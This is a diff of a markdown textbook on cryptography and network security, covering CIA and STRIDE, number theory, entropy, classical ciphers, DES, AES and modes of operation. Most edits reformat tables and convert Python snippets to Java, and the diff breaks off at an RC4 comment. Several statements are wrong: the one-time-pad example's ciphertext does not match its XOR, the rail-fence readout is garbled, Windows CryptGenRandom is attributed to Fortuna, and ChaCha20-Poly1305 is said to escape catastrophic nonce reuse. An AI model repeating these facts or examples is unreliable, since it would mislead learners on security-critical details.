@@ -1,5 +1,4 @@
 # The Complete Guide to Cryptography, Network Security & Cybersecurity
-
 ## From Zero to Expert — A Comprehensive Reference Book
 
 ---
@@ -24,28 +23,24 @@ Each chapter builds on the previous. Mathematical concepts are introduced gently
 ## Table of Contents
 
 ### PART I — FOUNDATIONS
-
 - Chapter 1: The Security Mindset
 - Chapter 2: Mathematics for Cryptography
 - Chapter 3: Information Theory & Entropy
 - Chapter 4: Classical Cryptography
 
 ### PART II — SYMMETRIC CRYPTOGRAPHY
-
 - Chapter 5: Block Ciphers & DES
 - Chapter 6: AES — The Advanced Encryption Standard
 - Chapter 7: Modes of Operation
 - Chapter 8: Stream Ciphers
 
 ### PART III — ASYMMETRIC CRYPTOGRAPHY
-
 - Chapter 9: Public Key Cryptography & RSA
 - Chapter 10: Elliptic Curve Cryptography
 - Chapter 11: Diffie-Hellman & Key Exchange
 - Chapter 12: Digital Signatures
 
 ### PART IV — CRYPTOGRAPHIC PROTOCOLS
-
 - Chapter 13: Hash Functions & MACs
 - Chapter 14: Key Derivation & Password Hashing
 - Chapter 15: TLS/SSL — Securing the Web
@@ -53,7 +48,6 @@ Each chapter builds on the previous. Mathematical concepts are introduced gently
 - Chapter 17: Advanced Protocols (Zero-Knowledge, MPC, Post-Quantum)
 
 ### PART V — COMPUTER NETWORKS
-
 - Chapter 18: Networking Fundamentals & the OSI Model
 - Chapter 19: Physical & Data Link Layer
 - Chapter 20: IP Networking
@@ -62,7 +56,6 @@ Each chapter builds on the previous. Mathematical concepts are introduced gently
 - Chapter 23: Routing & BGP
 
 ### PART VI — NETWORK SECURITY
-
 - Chapter 24: Firewalls & Packet Filtering
 - Chapter 25: Intrusion Detection & Prevention
 - Chapter 26: VPNs & Tunneling
@@ -72,7 +65,6 @@ Each chapter builds on the previous. Mathematical concepts are introduced gently
 - Chapter 30: Incident Response & Forensics
 
 ### PART VII — ADVANCED TOPICS
-
 - Chapter 31: Cryptanalysis — Breaking Ciphers
 - Chapter 32: Side-Channel Attacks
 - Chapter 33: Post-Quantum Cryptography
@@ -112,11 +104,11 @@ The foundation of information security is the **CIA Triad**:
 └──────────────────────────────────────────────────┘
 ```
 
-|Property|Definition|Example Attack|Example Control|
-|---|---|---|---|
-|**Confidentiality**|Information is accessible only to authorized parties|Eavesdropping, data theft|Encryption, access control|
-|**Integrity**|Information is accurate and unaltered|Man-in-the-middle, tampering|Digital signatures, MACs, hashing|
-|**Availability**|Systems are accessible when needed|DDoS, ransomware|Redundancy, backups, rate limiting|
+| Property | Definition | Example Attack | Example Control |
+|----------|------------|----------------|-----------------|
+| **Confidentiality** | Information is accessible only to authorized parties | Eavesdropping, data theft | Encryption, access control |
+| **Integrity** | Information is accurate and unaltered | Man-in-the-middle, tampering | Digital signatures, MACs, hashing |
+| **Availability** | Systems are accessible when needed | DDoS, ransomware | Redundancy, backups, rate limiting |
 
 Beyond CIA, modern security adds:
 
@@ -138,14 +130,14 @@ Threat modeling is the structured process of identifying what can go wrong and h
 
 Developed by Microsoft, STRIDE categorizes threats:
 
-|Threat|Violated Property|Example|
-|---|---|---|
-|**S**poofing|Authentication|Faking a sender address|
-|**T**ampering|Integrity|Modifying a database record|
-|**R**epudiation|Non-repudiation|Denying you sent a transaction|
-|**I**nformation Disclosure|Confidentiality|SQL injection leaking data|
-|**D**enial of Service|Availability|Flood attack overwhelming a server|
-|**E**levation of Privilege|Authorization|Exploiting a buffer overflow to get root|
+| Threat | Violated Property | Example |
+|--------|------------------|---------|
+| **S**poofing | Authentication | Faking a sender address |
+| **T**ampering | Integrity | Modifying a database record |
+| **R**epudiation | Non-repudiation | Denying you sent a transaction |
+| **I**nformation Disclosure | Confidentiality | SQL injection leaking data |
+| **D**enial of Service | Availability | Flood attack overwhelming a server |
+| **E**levation of Privilege | Authorization | Exploiting a buffer overflow to get root |
 
 ### Attack Trees
 
@@ -170,7 +162,6 @@ Goal: Steal Customer Credit Card Data
 Understanding your enemy is the first principle of defense. Attackers are categorized by:
 
 **By Motivation:**
-
 - Nation-state actors (APTs — Advanced Persistent Threats)
 - Organized crime (financial gain)
 - Hacktivists (ideological)
@@ -198,37 +189,29 @@ Breaking the kill chain at any stage stops the attack. Defense in depth means ha
 These core principles guide secure system design:
 
 ### Principle of Least Privilege
-
 Every user, program, and system should operate with the minimum privileges necessary to complete its task. A web server process should not run as root. A user account for reading reports should not have write access.
 
 ### Defense in Depth
-
 Do not rely on a single security control. Layer multiple controls so that failure of one does not compromise the entire system. (Firewalls + IDS + encryption + access control + monitoring, not just firewalls.)
 
 ### Fail Secure (Fail Closed)
-
 When a system fails, it should default to a secure state. A firewall that crashes should block all traffic, not allow all traffic.
 
 ### Open Design (Kerckhoffs's Principle)
-
 The security of a system should depend on the secrecy of the **key**, not the secrecy of the **algorithm**. Assume the attacker knows everything about your algorithm. This is why "security through obscurity" alone fails.
 
 > **Kerckhoffs's Principle (1883):** A cryptosystem should be secure even if everything about the system, except the key, is public knowledge.
 
 ### Economy of Mechanism
-
 Keep designs simple. Complex systems have more ways to fail. Every extra feature is a potential attack surface.
 
 ### Complete Mediation
-
 Every access to every resource must be checked for authorization. Cache carefully — cached permissions can become stale.
 
 ### Separation of Privilege
-
 Require multiple conditions to be satisfied before granting access. Two-factor authentication is the classic example.
 
 ### Psychological Acceptability
-
 Security measures must be usable. If a security control is too inconvenient, users will bypass it. The best security is the security people actually use.
 
 ## 1.5 Risk Management
@@ -240,7 +223,6 @@ Risk = Threat × Vulnerability × Impact
 ```
 
 **Risk Treatment Options:**
-
 - **Accept** — live with the risk (low impact or too costly to fix)
 - **Mitigate** — implement controls to reduce likelihood or impact
 - **Transfer** — buy insurance, outsource to a third party
@@ -250,13 +232,13 @@ Risk = Threat × Vulnerability × Impact
 
 CVSS provides a numerical score (0–10) for vulnerabilities:
 
-|Score|Severity|
-|---|---|
-|0.0|None|
-|0.1–3.9|Low|
-|4.0–6.9|Medium|
-|7.0–8.9|High|
-|9.0–10.0|Critical|
+| Score | Severity |
+|-------|----------|
+| 0.0 | None |
+| 0.1–3.9 | Low |
+| 4.0–6.9 | Medium |
+| 7.0–8.9 | High |
+| 9.0–10.0 | Critical |
 
 CVSS considers: Attack vector, complexity, privileges required, user interaction, scope, and impact on CIA.
 
@@ -287,7 +269,6 @@ Modular arithmetic is the mathematics of remainders. `a mod n` is the remainder 
 ### Modular Inverse
 
 The modular inverse of `a` modulo `n` is the number `a⁻¹` such that:
-
 ```
 a × a⁻¹ ≡ 1 (mod n)
 ```
@@ -301,7 +282,6 @@ The modular inverse exists if and only if `gcd(a, n) = 1` (they are coprime).
 The Greatest Common Divisor (GCD) of two numbers is fundamental in cryptography.
 
 **Standard Euclidean Algorithm:**
-
 ```
 gcd(48, 18):
   48 = 2 × 18 + 12
@@ -312,15 +292,25 @@ gcd(48, 18):
 
 **Extended Euclidean Algorithm** — finds integers x, y such that `ax + by = gcd(a,b)`:
 
-```python
-def extended_gcd(a, b):
-    if b == 0:
-        return a, 1, 0
-    g, x, y = extended_gcd(b, a % b)
-    return g, y, x - (a // b) * y
+```java
+import java.math.BigInteger;
 
-# gcd(35, 15) with coefficients:
-# 35 × 1 + 15 × (-2) = 5   ← gcd is 5
+// Extended Euclidean Algorithm — returns [gcd, x, y] where a*x + b*y = gcd
+static BigInteger[] extendedGcd(BigInteger a, BigInteger b) {
+    if (b.equals(BigInteger.ZERO)) {
+        return new BigInteger[]{a, BigInteger.ONE, BigInteger.ZERO};
+    }
+    BigInteger[] r = extendedGcd(b, a.mod(b));
+    BigInteger g = r[0], x = r[1], y = r[2];
+    return new BigInteger[]{g, y, x.subtract(a.divide(b).multiply(y))};
+}
+
+// Example: gcd(35, 15) with coefficients:
+// 35 × 1 + 15 × (-2) = 5   ← gcd is 5
+// BigInteger.valueOf(35) used in: extendedGcd(BigInteger.valueOf(35), BigInteger.valueOf(15))
+
+// Modular inverse via Java's built-in:
+// BigInteger modInverse = BigInteger.valueOf(17).modInverse(BigInteger.valueOf(3120));
 ```
 
 Used to compute modular inverses: if `gcd(a, n) = 1`, then `a⁻¹ ≡ x (mod n)`.
@@ -330,7 +320,6 @@ Used to compute modular inverses: if `gcd(a, n) = 1`, then `a⁻¹ ≡ x (mod n)
 A prime number is divisible only by 1 and itself. Primes are the atoms of number theory and the foundation of most public-key cryptography.
 
 **Key properties:**
-
 - There are infinitely many primes (Euclid's theorem)
 - Every integer > 1 has a unique prime factorization (Fundamental Theorem of Arithmetic)
 - Finding the prime factors of a large number is computationally hard → basis of RSA
@@ -338,7 +327,6 @@ A prime number is divisible only by 1 and itself. Primes are the atoms of number
 ### Fermat's Little Theorem
 
 If `p` is prime and `gcd(a, p) = 1`, then:
-
 ```
 a^(p-1) ≡ 1 (mod p)
 ```
@@ -348,7 +336,6 @@ This is used in RSA, primality testing, and modular exponentiation.
 ### Euler's Theorem
 
 Generalizes Fermat's Little Theorem. For `gcd(a, n) = 1`:
-
 ```
 a^φ(n) ≡ 1 (mod n)
 ```
@@ -381,7 +368,6 @@ These abstract algebraic structures underlie all of modern cryptography.
 ### Groups
 
 A **group** (G, ★) is a set G with a binary operation ★ satisfying:
-
 - **Closure**: a ★ b ∈ G for all a, b ∈ G
 - **Associativity**: (a ★ b) ★ c = a ★ (b ★ c)
 - **Identity**: there exists e such that a ★ e = a
@@ -390,7 +376,6 @@ A **group** (G, ★) is a set G with a binary operation ★ satisfying:
 If also **commutative** (a ★ b = b ★ a), it's an **abelian group**.
 
 Examples:
-
 - (ℤ, +) — integers under addition
 - (ℤₙ*, ×) — integers coprime to n under multiplication mod n
 - Points on an elliptic curve under point addition
@@ -429,7 +414,6 @@ A **field** (F, +, ×) is a set where both addition and multiplication form grou
 If you randomly sample from a set of N possibilities, you need approximately `√N` samples before a collision (two samples being equal) is likely.
 
 This has profound implications for cryptography:
-
 - A hash function with 128-bit output has 2^128 possible values
 - You only need about 2^64 samples to find a collision with good probability
 - This is why hash functions for collision resistance need **double** the bit length of their security parameter
@@ -453,27 +437,27 @@ One-time pad encryption: `C = P ⊕ K`, decryption: `P = C ⊕ K`
 
 Cryptographic security relies on problems being "hard" to solve. We measure hardness with complexity classes.
 
-|Notation|Meaning|Example (n = key size in bits)|
-|---|---|---|
-|O(1)|Constant|Array lookup|
-|O(log n)|Logarithmic|Binary search|
-|O(n)|Linear|Scanning a list|
-|O(n²)|Quadratic|Naive matrix multiply|
-|O(2^n)|Exponential|Brute-force key search|
-|O(n!)|Factorial|Traveling salesman|
+| Notation | Meaning | Example (n = key size in bits) |
+|----------|---------|-------------------------------|
+| O(1) | Constant | Array lookup |
+| O(log n) | Logarithmic | Binary search |
+| O(n) | Linear | Scanning a list |
+| O(n²) | Quadratic | Naive matrix multiply |
+| O(2^n) | Exponential | Brute-force key search |
+| O(n!) | Factorial | Traveling salesman |
 
 **Polynomial time** algorithms (O(nᵏ)) are considered "efficient." Cryptographic problems should have no known polynomial-time solution.
 
 ### Security Levels
 
-|Bits of Security|Operations to Break|Current Status (2024)|
-|---|---|---|
-|56|2^56 ≈ 7×10^16|Broken (DES)|
-|80|2^80 ≈ 10^24|Weak (avoid)|
-|112|2^112|Acceptable short-term|
-|128|2^128|Recommended minimum|
-|192|2^192|Post-quantum safe (approx)|
-|256|2^256|Long-term secure|
+| Bits of Security | Operations to Break | Current Status (2024) |
+|-----------------|--------------------|-----------------------|
+| 56 | 2^56 ≈ 7×10^16 | Broken (DES) |
+| 80 | 2^80 ≈ 10^24 | Weak (avoid) |
+| 112 | 2^112 | Acceptable short-term |
+| 128 | 2^128 | Recommended minimum |
+| 192 | 2^192 | Post-quantum safe (approx) |
+| 256 | 2^256 | Long-term secure |
 
 ---
 
@@ -496,20 +480,19 @@ H(X) = -Σ p(xᵢ) × log₂(p(xᵢ))
 - Maximum entropy of an n-bit string: n bits (uniform distribution)
 - Minimum entropy: 0 bits (the outcome is certain)
 
-**Example:** A fair coin: H = -(0.5×log₂0.5 + 0.5×log₂0.5) = -2×(0.5×(-1)) = **1 bit**
+**Example:**
+A fair coin: H = -(0.5×log₂0.5 + 0.5×log₂0.5) = -2×(0.5×(-1)) = **1 bit**
 
 A loaded coin (90% heads): H = -(0.9×log₂0.9 + 0.1×log₂0.1) ≈ **0.469 bits**
 
 ### Why Entropy Matters for Cryptography
 
 A key with low entropy is easy to guess:
-
 - "password123" ≈ 18 bits of entropy (lowercase + digits, short)
 - A random 128-bit key has exactly 128 bits of entropy
 - The key MUST have at least as much entropy as the security level you want
 
 **Password entropy** is why length matters more than complexity:
-
 - "correct horse battery staple" (4 random words) ≈ 44 bits
 - "P@$$w0rd!" ≈ 18 bits
 
@@ -518,7 +501,6 @@ A key with low entropy is easy to guess:
 Shannon defined **perfect secrecy**: a cipher is perfectly secret if the ciphertext reveals nothing about the plaintext — even to an adversary with unlimited computational power.
 
 **Formally:** For all plaintexts m and ciphertexts c:
-
 ```
 P(M = m | C = c) = P(M = m)
 ```
@@ -527,10 +509,9 @@ Seeing the ciphertext doesn't change your belief about the plaintext.
 
 ### The One-Time Pad
 
-Shannon proved the one-time pad (OTP) is the _only_ cipher achieving perfect secrecy.
+Shannon proved the one-time pad (OTP) is the *only* cipher achieving perfect secrecy.
 
 **How it works:**
-
 1. Generate a key K of the same length as the message M
 2. K must be truly random
 3. Encrypt: C = M ⊕ K
@@ -538,7 +519,6 @@ Shannon proved the one-time pad (OTP) is the _only_ cipher achieving perfect sec
 5. **Never reuse the key**
 
 **Example:**
-
 ```
 Plaintext:  HELLO         01001000 01000101 01001100 01001100 01001111
 Key:        XMCKL  →      01011000 01001101 01000011 01001011 01001100
@@ -546,12 +526,12 @@ Ciphertext: 35 08 1F 07 03
 ```
 
 **Why OTP is impractical:**
-
 - The key must be as long as the message
 - Keys can never be reused (if they are, XOR cancels them: C₁⊕C₂ = M₁⊕M₂)
 - Distributing the key securely is as hard as distributing the message
 
-**Why OTP matters:** It proves that perfect security is theoretically achievable. All practical ciphers trade perfect security for efficiency and key reuse, using computational hardness assumptions.
+**Why OTP matters:**
+It proves that perfect security is theoretically achievable. All practical ciphers trade perfect security for efficiency and key reuse, using computational hardness assumptions.
 
 ## 3.3 Computational Security
 
@@ -559,24 +539,25 @@ Since perfect secrecy is impractical, we settle for **computational security**: 
 
 ### Security Definitions
 
-**IND-CPA (Indistinguishability under Chosen Plaintext Attack):** An adversary who can encrypt chosen plaintexts cannot distinguish the encryption of two messages they choose. This requires **randomized encryption** — the same plaintext must encrypt to different ciphertexts each time.
+**IND-CPA (Indistinguishability under Chosen Plaintext Attack):**
+An adversary who can encrypt chosen plaintexts cannot distinguish the encryption of two messages they choose. This requires **randomized encryption** — the same plaintext must encrypt to different ciphertexts each time.
 
-**IND-CCA2 (Adaptive Chosen Ciphertext Attack):** An adversary who can decrypt any ciphertext except the target cannot determine what the target decrypts to. This is the gold standard for asymmetric encryption.
+**IND-CCA2 (Adaptive Chosen Ciphertext Attack):**
+An adversary who can decrypt any ciphertext except the target cannot determine what the target decrypts to. This is the gold standard for asymmetric encryption.
 
-**Semantic Security:** An adversary cannot learn any partial information about the plaintext from the ciphertext.
+**Semantic Security:**
+An adversary cannot learn any partial information about the plaintext from the ciphertext.
 
 ## 3.4 Pseudorandom Number Generators
 
 True randomness is expensive. Cryptography uses **Cryptographically Secure Pseudorandom Number Generators (CSPRNGs)**.
 
 A CSPRNG must satisfy:
-
 1. **Unpredictability forward**: outputs look random, even knowing all previous outputs
 2. **Unpredictability backward**: knowing current state doesn't reveal past outputs (backtracking resistance)
 3. **Seeded by true entropy**: typically from OS entropy sources
 
 **OS Entropy Sources:**
-
 - Hardware random number generators (Intel RDRAND, ARM TrueRNG)
 - Mouse movements, keyboard timing
 - Network packet timing
@@ -585,7 +566,6 @@ A CSPRNG must satisfy:
 **In Linux:** `/dev/random` (blocks when entropy is low) and `/dev/urandom` (never blocks, uses CSPRNG)
 
 **Common CSPRNGs:**
-
 - **Fortuna** (used in Windows CryptGenRandom)
 - **ChaCha20-based** (used in Linux kernel since 5.17, OpenBSD)
 - **HMAC-DRBG** (NIST SP 800-90A)
@@ -613,7 +593,8 @@ Plaintext:  HELLO
 Ciphertext: KHOOR
 ```
 
-**Encryption:** `C = (P + k) mod 26` **Decryption:** `P = (C - k) mod 26`
+**Encryption:** `C = (P + k) mod 26`
+**Decryption:** `P = (C - k) mod 26`
 
 **Breaking it:** Only 25 possible keys. Try all 25. This is a **brute force** attack. It takes microseconds.
 
@@ -666,7 +647,6 @@ Ciphertext: CKRPVY...
 Where m is the key length.
 
 **Breaking Vigenère — Kasiski Test:**
-
 1. Find repeated patterns in the ciphertext
 2. The distances between repetitions are likely multiples of the key length
 3. GCD of distances = probable key length
@@ -674,24 +654,21 @@ Where m is the key length.
 5. Each group is a Caesar cipher — apply frequency analysis
 
 **Index of Coincidence (IC):**
-
 ```
 IC = Σ (nᵢ × (nᵢ-1)) / (N × (N-1))
 ```
-
-English IC ≈ 0.065; random text IC ≈ 0.038. Using IC to find key length is called the **Friedman test**.
+English IC ≈ 0.065; random text IC ≈ 0.038.
+Using IC to find key length is called the **Friedman test**.
 
 ## 4.5 Playfair Cipher
 
 Encrypts digraphs (pairs of letters) instead of single letters, making simple frequency analysis harder.
 
 **Key setup:**
-
 1. Fill a 5×5 grid with a keyword (no repeats), then remaining alphabet (I=J)
 2. The grid becomes the cipher key
 
 **Encryption rules for pair (A, B):**
-
 - Same row: each shifts right one
 - Same column: each shifts down one
 - Different row and column: each takes the letter in same row but other's column (rectangle rule)
@@ -701,7 +678,6 @@ Encrypts digraphs (pairs of letters) instead of single letters, making simple fr
 Instead of substituting letters, rearrange them.
 
 **Rail Fence Cipher:**
-
 ```
 Plaintext:  WEAREDISCOVEREDRUNATONCE
 Depth 3:
@@ -712,7 +688,8 @@ W . . . E . . . I . . . V . . . D . . . U . . . T . . . E
 Read rows: WEIERDACRSOEERUNATOETCE → WEIDUVTENRDSOEERNAOCAC...
 ```
 
-**Columnar Transposition:** Write the message in rows, read off in column order (determined by key).
+**Columnar Transposition:**
+Write the message in rows, read off in column order (determined by key).
 
 ```
 Key:      3 1 4 2
@@ -730,7 +707,6 @@ Ciphertext: KAN TAW ATD AA...
 The Enigma machine (Germany, WWII) was a polyalphabetic cipher machine using rotating electrical rotors. It was the most complex cipher of its era — and its breaking by Alan Turing and others at Bletchley Park changed history.
 
 **How Enigma worked:**
-
 1. Operator presses a key
 2. Current flows through a plugboard (substitution)
 3. Through 3-5 rotors (each a substitution, position shifts with each keypress)
@@ -741,7 +717,6 @@ The Enigma machine (Germany, WWII) was a polyalphabetic cipher machine using rot
 **Key space:** ~10^23 — too large for brute force, but the machine had a fundamental flaw: **a letter could never encrypt to itself** (due to the reflector). This was exploited in Turing's **Bombe** machine.
 
 **Lessons from Enigma:**
-
 - Operational security failures often matter more than cryptanalysis
 - Reusing settings (weather reports always started the same way) gave cribs
 - Even brilliant mathematics needs to be combined with good key management
@@ -750,15 +725,14 @@ The Enigma machine (Germany, WWII) was a polyalphabetic cipher machine using rot
 
 All classical ciphers fail for one or more of these reasons:
 
-|Weakness|Example Cipher|Modern Solution|
-|---|---|---|
-|Too few keys (brute force)|Caesar (25 keys)|128+ bit keys (2^128 possibilities)|
-|Structure preserved (frequency analysis)|Substitution|Confusion + diffusion (modern block ciphers)|
-|Short key period exposed by statistics|Vigenère|Key as long as output (stream ciphers) or per-block expansion|
-|Ciphertext malleability|All classical|MACs and authenticated encryption|
+| Weakness | Example Cipher | Modern Solution |
+|----------|---------------|-----------------|
+| Too few keys (brute force) | Caesar (25 keys) | 128+ bit keys (2^128 possibilities) |
+| Structure preserved (frequency analysis) | Substitution | Confusion + diffusion (modern block ciphers) |
+| Short key period exposed by statistics | Vigenère | Key as long as output (stream ciphers) or per-block expansion |
+| Ciphertext malleability | All classical | MACs and authenticated encryption |
 
 Shannon's principles for secure ciphers:
-
 - **Confusion**: Make the relationship between key and ciphertext as complex as possible (substitution)
 - **Diffusion**: Spread the influence of each plaintext bit over many ciphertext bits (permutation)
 
@@ -784,7 +758,6 @@ Decrypt: D_k: {0,1}^n → {0,1}^n   (inverse of E_k)
 ```
 
 **Key properties:**
-
 - **Deterministic**: same key + same plaintext always = same ciphertext
 - **Invertible**: every ciphertext block decrypts to exactly one plaintext block
 - **Efficient**: both E_k and D_k run in polynomial time
@@ -792,25 +765,23 @@ Decrypt: D_k: {0,1}^n → {0,1}^n   (inverse of E_k)
 
 **Common block sizes and key sizes:**
 
-|Cipher|Block Size|Key Size|Status|
-|---|---|---|---|
-|DES|64 bits|56 bits|**Broken**|
-|3DES|64 bits|112/168 bits|Legacy|
-|AES-128|128 bits|128 bits|Secure|
-|AES-256|128 bits|256 bits|Secure|
-|Blowfish|64 bits|32-448 bits|Legacy|
-|Twofish|128 bits|128/192/256|Not widely used|
+| Cipher | Block Size | Key Size | Status |
+|--------|-----------|----------|--------|
+| DES | 64 bits | 56 bits | **Broken** |
+| 3DES | 64 bits | 112/168 bits | Legacy |
+| AES-128 | 128 bits | 128 bits | Secure |
+| AES-256 | 128 bits | 256 bits | Secure |
+| Blowfish | 64 bits | 32-448 bits | Legacy |
+| Twofish | 128 bits | 128/192/256 | Not widely used |
 
 ## 5.2 The Data Encryption Standard (DES)
 
 DES was the dominant cipher from 1977 to the late 1990s. Understanding DES is essential because:
-
 1. It introduced the Feistel structure used by many modern ciphers
 2. Its weaknesses motivated AES
 3. 3DES is still encountered in legacy systems
 
 ### DES Parameters
-
 - **Block size**: 64 bits
 - **Key size**: 64 bits (but only 56 are actually used; 8 bits are parity)
 - **Rounds**: 16
@@ -837,14 +808,12 @@ The Feistel structure is elegant: you only need to implement encryption, not dec
 ```
 
 At each round:
-
 ```
 L_i = R_{i-1}
 R_i = L_{i-1} ⊕ f(R_{i-1}, K_i)
 ```
 
 The round function f doesn't need to be invertible because decryption just reverses:
-
 ```
 R_{i-1} = L_i
 L_{i-1} = R_i ⊕ f(L_i, K_{i})
@@ -866,7 +835,6 @@ The round function f takes a 32-bit half-block and a 48-bit subkey:
 ### DES Key Schedule
 
 The 56-bit key generates 16 × 48-bit subkeys:
-
 1. Permuted Choice 1 (PC-1): selects 56 bits from 64-bit key
 2. Split into two 28-bit halves (C, D)
 3. For each round, rotate C and D left by 1 or 2 positions
@@ -876,16 +844,15 @@ The 56-bit key generates 16 × 48-bit subkeys:
 
 **56-bit key space = 2^56 ≈ 72 quadrillion keys**
 
-In 1998, EFF's "Deep Crack" machine cracked DES in 22 hours for $250,000. Today, FPGAs can break DES in minutes. The key is simply too short.
+In 1998, EFF's "Deep Crack" machine cracked DES in 22 hours for $250,000.
+Today, FPGAs can break DES in minutes. The key is simply too short.
 
 **Differential Cryptanalysis** (Biham & Shamir, 1990):
-
 - Analyzes how differences in plaintext pairs propagate to differences in ciphertext
 - Theoretical attack on DES needs 2^47 chosen plaintexts
 - DES's designers knew about this attack in 1974 — the S-boxes were specifically designed to resist it
 
 **Linear Cryptanalysis** (Matsui, 1993):
-
 - Finds linear approximations of the round function
 - Full DES broken with 2^43 known plaintexts
 
@@ -898,10 +865,10 @@ Encrypt: C = E_{K3}(D_{K2}(E_{K1}(P)))
 Decrypt: P = D_{K1}(E_{K2}(D_{K3}(C)))
 ```
 
-**Why EDE (Encrypt-Decrypt-Encrypt) instead of EEE?** When K1 = K2 = K3, 3DES reduces to single DES — backward compatibility.
+**Why EDE (Encrypt-Decrypt-Encrypt) instead of EEE?**
+When K1 = K2 = K3, 3DES reduces to single DES — backward compatibility.
 
 **3DES modes:**
-
 - **3-key 3DES (K1≠K2≠K3)**: 168-bit key, ~112 bits effective security
 - **2-key 3DES (K1=K3≠K2)**: 112-bit key, ~80 bits effective security
 
@@ -919,11 +886,11 @@ AES (FIPS 197) is the most widely deployed cipher in the world. It runs on every
 
 ## 6.2 AES Parameters
 
-|Version|Key Size|Rounds|
-|---|---|---|
-|AES-128|128 bits|10|
-|AES-192|192 bits|12|
-|AES-256|256 bits|14|
+| Version | Key Size | Rounds |
+|---------|----------|--------|
+| AES-128 | 128 bits | 10 |
+| AES-192 | 192 bits | 12 |
+| AES-256 | 256 bits | 14 |
 
 **Block size**: always 128 bits
 
@@ -947,14 +914,23 @@ State matrix (4×4 bytes = 128 bits):
 
 Each byte is replaced using the **AES S-Box** — an 8-bit substitution based on the multiplicative inverse in GF(2⁸) followed by an affine transformation.
 
-```python
-# S-Box lookup table (first row):
-SBOX = [0x63, 0x7c, 0x77, 0x7b, 0xf2, 0x6b, 0x6f, 0xc5, ...]
-# SubBytes: state[i][j] = SBOX[state[i][j]]
+```java
+// AES S-Box lookup table (first row shown):
+private static final int[] SBOX = {
+    0x63, 0x7c, 0x77, 0x7b, 0xf2, 0x6b, 0x6f, 0xc5,
+    0x30, 0x01, 0x67, 0x2b, 0xfe, 0xd7, 0xab, 0x76  // ... (256 entries total)
+};
+
+// SubBytes: replace each byte of state using the S-Box
+static void subBytes(int[][] state) {
+    for (int i = 0; i < 4; i++)
+        for (int j = 0; j < 4; j++)
+            state[i][j] = SBOX[state[i][j]];
+}
+// Note: In practice, use javax.crypto.Cipher with "AES" — never implement AES manually
 ```
 
 The S-Box was designed to have:
-
 - No fixed points (s(x) ≠ x)
 - No opposite fixed points (s(x) ≠ x̄)
 - Maximum nonlinearity (resistance to linear cryptanalysis)
@@ -987,7 +963,6 @@ MixColumns ensures that every input byte affects every output byte — providing
 **4. AddRoundKey (Key Integration)**
 
 The 128-bit round key is XORed with the state:
-
 ```
 state[i][j] ^= roundKey[i][j]
 ```
@@ -1027,7 +1002,6 @@ The key schedule expands the initial key into (Nr+1) × 128-bit round keys using
 ### AES-NI (Hardware Acceleration)
 
 Modern CPUs include dedicated AES instructions:
-
 - `AESENC` — one round of AES encryption
 - `AESENCLAST` — final round of AES encryption
 - `AESDEC` / `AESDECLAST` — decryption equivalents
@@ -1071,15 +1045,14 @@ C_0 = IV (Initialization Vector)
 ```
 
 **Properties:**
-
 - **IV must be random and unpredictable** (not reused)
 - Same plaintext + different IV = different ciphertext ✓
 - Identical blocks no longer produce identical ciphertext ✓
 - **Sequential encryption** (can't parallelize encryption, but can parallelize decryption)
 - **Error propagation**: 1-bit error in C_i corrupts P_i entirely and flips 1 bit in P_{i+1}
 
-**CBC Padding:** Since CBC requires full blocks, the last block must be padded. **PKCS#7** padding is standard:
-
+**CBC Padding:**
+Since CBC requires full blocks, the last block must be padded. **PKCS#7** padding is standard:
 ```
 If 3 bytes needed: add 03 03 03
 If 5 bytes needed: add 05 05 05 05 05
@@ -1101,7 +1074,6 @@ P_i = C_i ⊕ K_i
 ```
 
 **Properties:**
-
 - **Fully parallelizable** (both encryption and decryption) ✓
 - **Random access**: can decrypt any block independently ✓
 - **No padding needed**: works on any length ✓
@@ -1127,13 +1099,11 @@ Decryption:
 **AAD (Additional Authenticated Data):** Data that is authenticated but not encrypted (e.g., packet headers, metadata). Tampering with AAD is detected.
 
 **Properties:**
-
 - **Authenticated**: any tampering with ciphertext or AAD is detected ✓
 - **Parallelizable** ✓
 - **Nonce must NEVER be reused** — nonce reuse in GCM is catastrophic, allowing the key to be recovered
 
 **GCM usage:**
-
 - TLS 1.2/1.3: AES-128-GCM and AES-256-GCM
 - IPSec
 - SSH
@@ -1148,12 +1118,10 @@ CCM = Counter with CBC-MAC. Also provides AEAD but processes data twice (less ef
 ## 7.7 ChaCha20-Poly1305 ✓✓✓
 
 An alternative AEAD construction that doesn't use AES:
-
 - **ChaCha20**: a stream cipher (encryption)
 - **Poly1305**: a MAC (authentication)
 
 **Advantages over AES-GCM:**
-
 - Faster in software (no hardware acceleration needed)
 - Resistant to timing attacks (no table lookups)
 - No catastrophic nonce reuse failure (misuse-resistant variant: XChaCha20)
@@ -1162,14 +1130,14 @@ Used in TLS 1.3, Noise protocol, WireGuard VPN, and as an AES fallback on mobile
 
 ## 7.8 Comparison Table
 
-|Mode|Authenticated|Parallel Enc|Parallel Dec|Nonce Required|Use Case|
-|---|---|---|---|---|---|
-|ECB|❌|✅|✅|No|**Never use**|
-|CBC|❌|❌|✅|Yes (random)|Legacy only|
-|CTR|❌|✅|✅|Yes (unique)|Rare (use GCM)|
-|GCM|✅|✅|✅|Yes (unique)|**Recommended**|
-|CCM|✅|❌|❌|Yes (unique)|IoT, WiFi|
-|ChaCha20-Poly1305|✅|✅|✅|Yes (unique)|**Recommended**|
+| Mode | Authenticated | Parallel Enc | Parallel Dec | Nonce Required | Use Case |
+|------|--------------|-------------|-------------|----------------|----------|
+| ECB  | ❌ | ✅ | ✅ | No | **Never use** |
+| CBC  | ❌ | ❌ | ✅ | Yes (random) | Legacy only |
+| CTR  | ❌ | ✅ | ✅ | Yes (unique) | Rare (use GCM) |
+| GCM  | ✅ | ✅ | ✅ | Yes (unique) | **Recommended** |
+| CCM  | ✅ | ❌ | ❌ | Yes (unique) | IoT, WiFi |
+| ChaCha20-Poly1305 | ✅ | ✅ | ✅ | Yes (unique) | **Recommended** |
 
 ---
 
@@ -1186,7 +1154,6 @@ Plaintext  = Ciphertext ⊕ Keystream
 ```
 
 Stream ciphers are especially useful for:
-
 - Continuous/streaming data (voice, video)
 - Hardware with limited resources
 - When variable-length data must be encrypted without padding
@@ -1196,31 +1163,37 @@ Stream ciphers are especially useful for:
 RC4 (Ron's Code 4, 1987) was the world's most-used stream cipher, appearing in WEP, WPA, SSL/TLS, and RDP.
 
 **RC4 Key Scheduling Algorithm (KSA):**
-
-```python
-def ksa(key):
-    S = list(range(256))
-    j = 0
-    for i in range(256):
-        j = (j + S[i] + key[i % len(key)]) % 256
-        S[i], S[j] = S[j], S[i]
-    return S
+```java
+// RC4 Key Scheduling Algorithm (KSA) — FOR EDUCATIONAL PURPOSES ONLY. Never use RC4.
